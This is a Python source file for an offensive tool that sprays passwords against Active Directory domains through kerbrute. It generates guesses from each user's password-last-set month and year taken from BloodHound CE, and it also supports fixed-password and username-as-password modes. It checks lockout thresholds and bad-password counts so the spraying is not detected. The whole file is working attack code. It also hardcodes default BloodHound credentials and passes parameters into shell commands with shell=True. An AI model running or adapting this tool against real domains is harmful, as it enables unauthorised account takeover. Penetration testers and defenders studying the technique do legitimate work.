#!/usr/bin/env python3
"""
Password spraying tool using kerbrute with smart date-based password generation.

This tool performs password spraying attacks against Active Directory domains using
kerbrute, with intelligent password generation based on password last change dates
from BloodHound CE.
"""
import argparse
import subprocess
import tempfile
import re
import os
import sys
from typing import List, Tuple, Dict, Optional, Union
from pathlib import Path
from bloodhound_cli.core.ce import BloodHoundCEClient
import curses
from datetime import datetime, timezone
from loguru import logger

# Configure Loguru logging
logger.remove()  # Remove default handler
logger.add(
    sys.stderr,
    format="<green>{time:YYYY-MM-DD HH:mm:ss}</green> | <level>{level: <8}</level> | <level>{message}</level>",
    level="INFO",
    colorize=True,
    backtrace=True,
    diagnose=True,
)


def clean_ansi(text: str) -> str:
    """
    Remove ANSI escape codes from text.

    Args:
        text: Text that may contain ANSI escape codes

    Returns:
        Text with ANSI escape codes removed
    """
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    return ansi_escape.sub('', text)

def get_netexec_users(dc_ip: str, username: str, password: str, domain: str) -> List[Tuple[str, int]]:
    """
    Execute netexec to get user list with BadPwdCount.

    Uses grep and awk to filter the output.

    Args:
        dc_ip: Domain Controller IP address
        username: Username for netexec authentication
        password: Password for netexec authentication
        domain: Target domain name

    Returns:
        List of tuples containing (username, badpw_count)

    Raises:
        SystemExit: If netexec execution fails
    """
    # Check if the specific netexec path exists
    netexec_path = "/root/.adscan/tool_venvs/netexec/venv/bin/nxc"
    nxc_cmd = netexec_path if os.path.exists(netexec_path) else 'nxc'
    cmd = (
        f"{nxc_cmd} smb {dc_ip} -u '{username}' -p '{password}' -d {domain} --users "
        "| grep -v '<never>' | awk '{print $5,$8}' | grep -v ']' | grep -v '-Username- Set-'"
    )
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, check=True, timeout=300
        )
    except subprocess.CalledProcessError as e:
        logger.error(
            "Error executing netexec to get users: {}. stderr: {}",
            e,
            clean_ansi(e.stderr) if e.stderr else "N/A"
        )
        sys.exit(1)
    except subprocess.TimeoutExpired:
        logger.error("Netexec command timed out after 300 seconds")
        sys.exit(1)

    users: List[Tuple[str, int]] = []
    for line in result.stdout.splitlines():
        line = line.strip()
        if not line:
            continue
        parts = line.split()
        if len(parts) < 2:
            continue
        user = parts[0]
        try:
            badpw = int(parts[1])
        except ValueError:
            logger.debug("Skipping line with invalid BadPwdCount: %s", line)
            continue
        users.append((user, badpw))
    return users

def get_account_lockout_threshold(
    dc_ip: str, username: str, password: str, domain: str
) -> Union[int, str]:
    """
    Execute netexec to extract account lockout threshold.

    Args:
        dc_ip: Domain Controller IP address
        username: Username for netexec authentication
        password: Password for netexec authentication
        domain: Target domain name

    Returns:
        Account lockout threshold as integer, or string if parsing fails

    Raises:
        SystemExit: If netexec execution fails or threshold cannot be found
    """
    # Check if the specific netexec path exists
    netexec_path = "/root/.adscan/tool_venvs/netexec/venv/bin/nxc"
    nxc_cmd = netexec_path if os.path.exists(netexec_path) else 'nxc'
    cmd = f"{nxc_cmd} smb {dc_ip} -u '{username}' -p '{password}' -d {domain} --pass-pol"
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, check=True, timeout=300
        )
    except subprocess.CalledProcessError as e:
        logger.error(
            "Error executing netexec to get lockout policy: {}. stderr: {}",
            e,
            clean_ansi(e.stderr) if e.stderr else "N/A"
        )
        sys.exit(1)
    except subprocess.TimeoutExpired:
        logger.error("Netexec command timed out after 300 seconds")
        sys.exit(1)

    match = re.search(r'(?i)Account\s+Lockout\s+Threshold\s*:\s*(.*)', result.stdout)
    if match:
        value = match.group(1).strip()
        try:
            return int(value)
        except ValueError:
            logger.warning("Could not parse lockout threshold as integer: %s", value)
            return value
    else:
        logger.error("Could not extract Account lockout threshold from domain.")
        sys.exit(1)

def read_enabled_users(enabled_users_file: str) -> set:
    """
    Read list of enabled users from a file (one user per line).

    Args:
        enabled_users_file: Path to file containing usernames

    Returns:
        Set of enabled usernames

    Raises:
        SystemExit: If file cannot be read
    """
    try:
        file_path = Path(enabled_users_file)
        if not file_path.exists():
            logger.error("User list file does not exist: {}", enabled_users_file)
            sys.exit(1)
        with open(file_path, "r", encoding="utf-8") as f:
            enabled_users = {line.strip() for line in f if line.strip()}
        return enabled_users
    except OSError as e:
        logger.error(
            "Error reading enabled users list from {}: {}",
            enabled_users_file,
            e
        )
        sys.exit(1)

def curses_menu(stdscr: curses.window, title: str, options: List[str]) -> int:
    """
    Display interactive curses menu to select an option.

    Args:
        stdscr: Curses window object
        title: Menu title
        options: List of menu options

    Returns:
        Index of selected option
    """
    curses.curs_set(0)
    selected = 0
    while True:
        stdscr.clear()
        stdscr.addstr(0, 0, title, curses.A_BOLD)
        for idx, option in enumerate(options):
            if idx == selected:
                stdscr.addstr(idx + 2, 2, f"> {option}", curses.A_REVERSE)
            else:
                stdscr.addstr(idx + 2, 2, f"  {option}")
        stdscr.refresh()
        key = stdscr.getch()
        if key in [curses.KEY_UP, ord('k')]:
            selected = (selected - 1) % len(options)
        elif key in [curses.KEY_DOWN, ord('j')]:
            selected = (selected + 1) % len(options)
        elif key in [curses.KEY_ENTER, ord('\n')]:
            return selected

def smart_date_menu() -> Tuple[str, str, str]:
    """
    Interactive curses interface to select spray parameters.

    Selects:
      - Language (English or Spanish)
      - Month case (Lower, e.g., january2025; or Upper, e.g., January2025)
      - Spray format for months (using 'month' placeholder)

    Returns:
        Tuple containing (language, month_case, spray_format_option)
    """
    languages = ["English", "Spanish"]
    case_options = ["Lower (e.g., january2025)", "Upper (e.g., January2025)"]
    mode_options = ["months"]
    months_formats = [
        "{month}{full_year}", "{month}.{full_year}", "{month}{full_year}.", "{month}@{full_year}", "{month}{full_year}!",
        "{month}{year_short}", "{month}.{year_short}", "{month}{year_short}.", "{month}@{year_short}", "{month}{year_short}!",
        "All"
    ]
    def curses_logic(stdscr):
        lang_idx = curses_menu(stdscr, "Select language:", languages)
        case_idx = curses_menu(stdscr, "Select month case:", case_options)
        mode_idx = curses_menu(stdscr, "Select spray mode:", mode_options)
        fmt_idx = curses_menu(stdscr, "Select months spray format:", months_formats)
        month_case = "lower" if case_idx == 0 else "upper"
        return languages[lang_idx], month_case, months_formats[fmt_idx]
    return curses.wrapper(curses_logic)

def smart_date_formats() -> List[str]:
    """
    Return list of date formats for months with 'month' placeholder.

    Returns:
        List of format strings
    """
    return [
        "{month}{full_year}", "{month}.{full_year}", "{month}{full_year}.", "{month}@{full_year}", "{month}{full_year}!",
        "{month}{year_short}", "{month}.{year_short}", "{month}{year_short}.", "{month}@{year_short}", "{month}{year_short}!",
        "All"
    ]

def generate_spray_list(
    analyzer: BloodHoundCEClient, domain: str, smart_params: Tuple
) -> List[str]:
    """
    Generate spray list using data from bloodhound-cli.

    If smart_params has 3 elements, assumes interactive mode (curses) and uses "month" placeholder.
    If smart_params has 4 elements, assumes non-interactive mode with format (lang, type, case, format_option),
    using "type" placeholder.

    Args:
        analyzer: BloodHound CE client instance
        domain: Target domain name
        smart_params: Tuple containing spray parameters

    Returns:
        List of "user:password" lines
    """
    if len(smart_params) == 3:
        language, month_case, fmt_option = smart_params
        placeholder = "month"
        def format_value(dt):
            month_eng = dt.strftime("%B")
            if language == "Spanish":
                spanish_months = {
                    "January": "enero", "February": "febrero", "March": "marzo", "April": "abril",
                    "May": "mayo", "June": "junio", "July": "julio", "August": "agosto",
                    "September": "septiembre", "October": "octubre", "November": "noviembre", "December": "diciembre"
                }
                base = spanish_months.get(month_eng, month_eng.lower())
            else:
                base = month_eng
            return base.lower() if month_case == "lower" else base.capitalize()
    else:
        language, smart_type, case_option, fmt_option = smart_params
        placeholder = "type"
        def format_value(_):
            return smart_type.lower() if case_option == "low" else smart_type.capitalize()

    data = analyzer.get_password_last_change(domain)
    spray_lines = []
    for record in data:
        user = record['samaccountname']
        ts = record.get('pwdlastset')
        try:
            ts_float = float(ts)
            if ts_float == 0:
                wc = record.get('whencreated')
                dt = datetime.fromtimestamp(float(wc), tz=timezone.utc)
            else:
                dt = datetime.fromtimestamp(ts_float, tz=timezone.utc)
        except (ValueError, TypeError, KeyError) as e:
            logger.error(
                "Error converting timestamp for user {}: {}",
                user,
                e
            )
            continue
        year_full = dt.strftime("%Y")
        year_short = dt.strftime("%y")
        type_formatted = format_value(dt)
        def apply_format(fmt_str):
            return fmt_str.format(**{placeholder: type_formatted, "full_year": year_full, "year_short": year_short})
        if fmt_option == "All":
            variants = [fmt for fmt in smart_date_formats() if fmt != "All"]
            spray_candidates = [apply_format(fmt) for fmt in variants]
            password = ",".join(spray_candidates)
        else:
            password = apply_format(fmt_option)
        spray_lines.append(f"{user}:{password}")
    return spray_lines

def write_temp_spray_file(lines: List[str]) -> str:
    """
    Write spray list to a temporary file ("user:password" format).

    Args:
        lines: List of "user:password" lines

    Returns:
        Path to temporary file
    """
    tmp = tempfile.NamedTemporaryFile(mode='w', delete=False)
    for line in lines:
        tmp.write(line + "\n")
    tmp.close()
    return tmp.name

def run_smart_kerbrute(domain: str, dc_ip: str, temp_file: str) -> None:
    """
    Execute kerbrute bruteforce using temporary file.

    Args:
        domain: Target domain name
        dc_ip: Domain Controller IP address
        temp_file: Path to temporary file with user:password pairs

    Raises:
        SystemExit: If kerbrute execution fails
    """
    cmd = ["kerbrute", "bruteforce", "-d", domain, "--dc", dc_ip, temp_file]
    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True, check=True, timeout=3600
        )
        logger.info(clean_ansi(result.stdout))
    except subprocess.CalledProcessError as e:
        logger.error("Error executing kerbrute: {}", e)
        if e.stdout:
            logger.error("kerbrute stdout: {}", clean_ansi(e.stdout))
        if e.stderr:
            logger.error("kerbrute stderr: {}", clean_ansi(e.stderr))
        sys.exit(1)
    except subprocess.TimeoutExpired:
        logger.error("Kerbrute command timed out after 3600 seconds")
        sys.exit(1)

def write_temp_users_file(users: List[str]) -> str:
    """
    Write eligible users list to a temporary file.

    Args:
        users: List of usernames

    Returns:
        Path to temporary file
    """
    tmp = tempfile.NamedTemporaryFile(mode='w', delete=False)
    for user in users:
        tmp.write(user + "\n")
    tmp.close()
    return tmp.name

def run_kerbrute(
    domain: str,
    dc_ip: str,
    temp_users_file: str,
    spray_password: Optional[str],
    use_user_as_pass: bool = False,
    output_dir: Optional[str] = None
) -> None:
    """
    Execute kerbrute passwordspray using user list.

    Args:
        domain: Target domain name
        dc_ip: Domain Controller IP address
        temp_users_file: Path to temporary file with usernames
        spray_password: Password to spray (None for bruteforce mode)
        use_user_as_pass: If True, add --user-as-pass flag
        output_dir: Optional output directory for kerbrute results

    Raises:
        SystemExit: If kerbrute execution fails
    """
    if use_user_as_pass:
        cmd = ["kerbrute", "passwordspray", "-d", domain, "--dc", dc_ip, "--user-as-pass", temp_users_file]
    else:
        if spray_password:
            cmd = ["kerbrute", "passwordspray", "-d", domain, "--dc", dc_ip, temp_users_file, spray_password]
        else:
            cmd = ["kerbrute", "bruteforce", "-d", domain, "--dc", dc_ip, temp_users_file]
    if output_dir:
        cmd.extend(["-o", output_dir])
    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True, check=True, timeout=3600
        )
        logger.info(clean_ansi(result.stdout))
    except subprocess.CalledProcessError as e:
        logger.error("Error executing kerbrute: {}", e)
        if e.stdout:
            logger.error("kerbrute stdout: {}", clean_ansi(e.stdout))
        if e.stderr:
            logger.error("kerbrute stderr: {}", clean_ansi(e.stderr))
        sys.exit(1)
    except subprocess.TimeoutExpired:
        logger.error("Kerbrute command timed out after 3600 seconds")
        sys.exit(1)

# --- Main con subcomandos ---
def main():
    parser = argparse.ArgumentParser(
        description="Script para realizar password spraying con kerbrute mediante subcomandos."
    )
    subparsers = parser.add_subparsers(dest="subcommand", required=True, help="Modo de spraying")

    # Subcomando smart (modo smart-date)
    smart_parser = subparsers.add_parser("smart",
        help="Spraying inteligente (smart-date) usando bloodhound-cli; no requiere -u ni -p")
    smart_parser.add_argument("-d", required=True, help="Dominio (usado para bloodhound-cli y kerbrute)")
    smart_parser.add_argument("--dc-ip", required=True, help="IP del Domain Controller (PDC)")
    smart_parser.add_argument("-ul", help="Username para netexec (opcional)")
    smart_parser.add_argument("-pl", help="Password para netexec (opcional)")
    smart_parser.add_argument("-t", type=int, default=0, help="Threshold seguro")
    smart_parser.add_argument("-target-domain", help="Dominio objetivo para kerbrute")
    smart_parser.add_argument("-o", "--output", help="Directorio donde guardar el output de kerbrute")
    # Parámetros para uso no interactivo (todos deben especificarse o ninguno)
    smart_parser.add_argument("--lang", choices=["English", "Spanish"],
                              help="Idioma para spray: English o Spanish")
    smart_parser.add_argument("--type", choices=["month"], help="Tipo de spray (por ahora, solo 'month')")
    smart_parser.add_argument("-c", "--case", choices=["lower", "upper"],
                              help="Presentación del tipo: 'lower' para minúsculas o 'upper' para mayúsculas")
    available_formats = {
        1: "{type}{full_year}",
        2: "{type}.{full_year}",
        3: "{type}{full_year}.",
        4: "{type}@{full_year}",
        5: "{type}{full_year}!",
        6: "{type}{year_short}",
        7: "{type}.{year_short}",
        8: "{type}{year_short}.",
        9: "{type}@{year_short}",
        10: "{type}{year_short}!"
    }
    format_help = "\n".join([f"{k}: {v}" for k, v in available_formats.items()])
    smart_parser.add_argument("-f", "--format", type=int, choices=range(1, len(available_formats)+1),
                              help=f"ID del formato de spray. Opciones:\n{format_help}\nSi se omite, se muestra menú interactivo.")
    smart_parser.add_argument("--debug", action="store_true", help="Activar modo debug")

    # Subcomando password (usa lista de usuarios y contraseña fija -p)
    password_parser = subparsers.add_parser("password",
        help="Spraying con contraseña fija; requiere lista de usuarios (-u) y contraseña (-p)")
    password_parser.add_argument("-d", required=True, help="Dominio (usado para netexec y kerbrute)")
    password_parser.add_argument("--dc-ip", required=True, help="IP del Domain Controller (PDC)")
    password_parser.add_argument("-ul", help="Username para netexec (opcional)")
    password_parser.add_argument("-pl", help="Password para netexec (opcional)")
    password_parser.add_argument("-t", type=int, default=0, help="Threshold seguro")
    password_parser.add_argument("-u", required=True, help="Ruta a la lista de usuarios habilitados")
    password_parser.add_argument("-p", required=True, help="Contraseña para password spraying (kerbrute)")
    password_parser.add_argument("-target-domain", help="Dominio objetivo para kerbrute")
    password_parser.add_argument("-o", "--output", help="Directorio donde guardar el output de kerbrute")
    password_parser.add_argument("--debug", action="store_true", help="Activar modo debug")

    # Subcomando useraspass (usa lista de usuarios y user-as-pass)
    useraspass_parser = subparsers.add_parser("useraspass",
        help="Spraying con user-as-pass; requiere lista de usuarios (-u) y opción --low o --up")
    useraspass_parser.add_argument("-d", required=True, help="Dominio (usado para netexec y kerbrute)")
    useraspass_parser.add_argument("--dc-ip", required=True, help="IP del Domain Controller (PDC)")
    useraspass_parser.add_argument("-ul", help="Username para netexec (opcional)")
    useraspass_parser.add_argument("-pl", help="Password para netexec (opcional)")
    useraspass_parser.add_argument("-t", type=int, default=0, help="Threshold seguro")
    useraspass_parser.add_argument("-u", required=True, help="Ruta a la lista de usuarios habilitados")
    group_useraspass = useraspass_parser.add_mutually_exclusive_group(required=False)
    group_useraspass.add_argument("--low", action="store_true", help="Utilizar user-as-pass con usuario en minúsculas")
    group_useraspass.add_argument("--up", action="store_true", help="Utilizar user-as-pass con usuario con primera letra en mayúsculas")
    useraspass_parser.add_argument("-target-domain", help="Dominio objetivo para kerbrute")
    useraspass_parser.add_argument("-o", "--output", help="Directorio donde guardar el output de kerbrute")
    useraspass_parser.add_argument("--debug", action="store_true", help="Activar modo debug")

    args = parser.parse_args()

    # Configure logging if debug is enabled
    if args.debug:
        logger.remove()
        logger.add(sys.stderr, level="DEBUG", colorize=True, backtrace=True, diagnose=True)
        logger.debug("Debug mode enabled. Showing detailed information.")

    # Función común para obtener usuarios elegibles (usando netexec si se proporcionan credenciales)
    def get_eligible_users(domain, users_file, dc_ip, ul, pl, threshold):
        if ul and pl:
            logger.info("[*] Obteniendo Account lockout threshold del dominio...")
            account_threshold = get_account_lockout_threshold(dc_ip, ul, pl, domain)
            logger.info(f"[*] Account lockout threshold obtenido: {account_threshold}")
            if isinstance(account_threshold, int):
                logger.info("[*] Obteniendo usuarios y su BadPW con netexec...")
                netexec_users = get_netexec_users(dc_ip, ul, pl, domain)
                if not netexec_users:
                    logger.error("No se obtuvieron usuarios de netexec.")
                    sys.exit(1)
                logger.info("[*] Leyendo lista de usuarios habilitados...")
                file_users = read_enabled_users(users_file)
                eligible = []
                for user, badpw in netexec_users:
                    if user in file_users:
                        remaining = account_threshold - badpw
                        if remaining > threshold:
                            eligible.append(user)
                        else:
                            logger.debug(f"[-] Usuario {user} no elegible. BadPW: {badpw}, intentos restantes: {remaining}")
                if not eligible:
                    logger.info("No hay usuarios elegibles según el threshold seguro.")
                    sys.exit(0)
                return eligible
            else:
                return list(read_enabled_users(users_file))
        else:
            return list(read_enabled_users(users_file))

    # Procesar subcomandos
    if args.subcommand == "smart":
        if args.debug:
            logger.remove()
            logger.add(sys.stderr, level="DEBUG", colorize=True, backtrace=True, diagnose=True)
        logger.info("[*] Modo smart activado. Obteniendo datos de password last change desde bloodhound-cli...")
        bh_base_url = os.getenv("BH_CE_BASE_URL", "http://localhost:8080")
        bh_username = os.getenv("BH_CE_USERNAME", "admin")
        bh_password = os.getenv("BH_CE_PASSWORD", "Bloodhound123!")
        analyzer = BloodHoundCEClient(base_url=bh_base_url)
        # Ensure valid token (authenticate if needed)
        if not analyzer.ensure_valid_token():
            logger.info(f"[*] Autenticando con BloodHound CE usando usuario: {bh_username}")
            token = analyzer.authenticate(bh_username, bh_password)
            if not token:
                logger.error("[!] Error al autenticar con BloodHound CE. Verifica las credenciales.")
                sys.exit(1)
        # Si se especifican --lang, --type, --case y --format, se usan directamente
        if args.lang and args.type and args.case and (args.format is not None):
            available_formats = {
                1: "{"f"{args.type}""}{full_year}",
                2: "{"f"{args.type}""}.{full_year}",
                3: "{"f"{args.type}""}{full_year}.",
                4: "{"f"{args.type}""}@{full_year}",
                5: "{"f"{args.type}""}{full_year}!",
                6: "{"f"{args.type}""}{year_short}",
                7: "{"f"{args.type}""}.{year_short}",
                8: "{"f"{args.type}""}{year_short}.",
                9: "{"f"{args.type}""}@{year_short}",
                10: "{"f"{args.type}""}{year_short}!"
            }
            if args.format not in available_formats:
                logger.error("Formato ID no válido.")
                sys.exit(1)
            smart_params = (args.lang, args.case, available_formats[args.format])
        else:
            smart_params = smart_date_menu()  # (language, month_case, spray_format_option)
        logger.info(f"[*] Se seleccionó: {smart_params}")
        data = analyzer.get_password_last_change(args.d)
        eligible_users = [record['samaccountname'] for record in data]
        spray_list = generate_spray_list(analyzer, args.d, smart_params)
        analyzer.close()
        logger.info(f"[*] Número de usuarios para spraying (smart): {len(eligible_users)}")
        temp_file = write_temp_spray_file(spray_list)
        spray_password = None
        use_user_as_pass = False
        kerbrute_domain = args.target_domain if args.target_domain else args.d
        logger.info("[*] Ejecutando kerbrute en modo smart...")
        run_kerbrute(kerbrute_domain, args.dc_ip, temp_file, spray_password, use_user_as_pass=use_user_as_pass, output_dir=args.output)
        os.remove(temp_file)
        logger.info("[*] Proceso completado en modo smart.")

    elif args.subcommand == "password":
        if args.debug:
            logger.remove()
            logger.add(sys.stderr, level="DEBUG", colorize=True, backtrace=True, diagnose=True)
        logger.info("[*] Modo password activado. Procesando spraying en modo password...")
        eligible_users = get_eligible_users(args.d, args.u, args.dc_ip, args.ul, args.pl, args.t)
        logger.info(f"[*] Número de usuarios elegibles para spraying (password): {len(eligible_users)}")
        spray_list = [f"{user}:{args.p}" for user in eligible_users]
        temp_file = write_temp_users_file(eligible_users)
        use_user_as_pass = False
        kerbrute_domain = args.target_domain if args.target_domain else args.d
        logger.info("[*] Ejecutando kerbrute en modo password...")
        run_kerbrute(kerbrute_domain, args.dc_ip, temp_file, args.p, use_user_as_pass=use_user_as_pass, output_dir=args.output)
        os.remove(temp_file)
        logger.info("[*] Proceso completado en modo password.")

    elif args.subcommand == "useraspass":
        if args.debug:
            logger.remove()
            logger.add(sys.stderr, level="DEBUG", colorize=True, backtrace=True, diagnose=True)
        logger.info("[*] Modo useraspass activado. Procesando spraying en modo useraspass...")
        eligible_users = get_eligible_users(args.d, args.u, args.dc_ip, args.ul, args.pl, args.t)
        logger.info(f"[*] Número de usuarios elegibles para spraying (useraspass): {len(eligible_users)}")
        use_user_as_pass = False
        if args.low:
            eligible_users = [user.lower() for user in eligible_users]
            use_user_as_pass = True
        elif args.up:
            eligible_users = [user.capitalize() for user in eligible_users]
            use_user_as_pass = True
        else:
            # No case specified: use exact username as password
            use_user_as_pass = True
        temp_file = write_temp_users_file(eligible_users)
        kerbrute_domain = args.target_domain if args.target_domain else args.d
        logger.info("[*] Ejecutando kerbrute en modo useraspass...")
        run_kerbrute(kerbrute_domain, args.dc_ip, temp_file, None, use_user_as_pass=use_user_as_pass, output_dir=args.output)
        os.remove(temp_file)
        logger.info("[*] Proceso completado en modo useraspass.")

if __name__ == "__main__":
    main()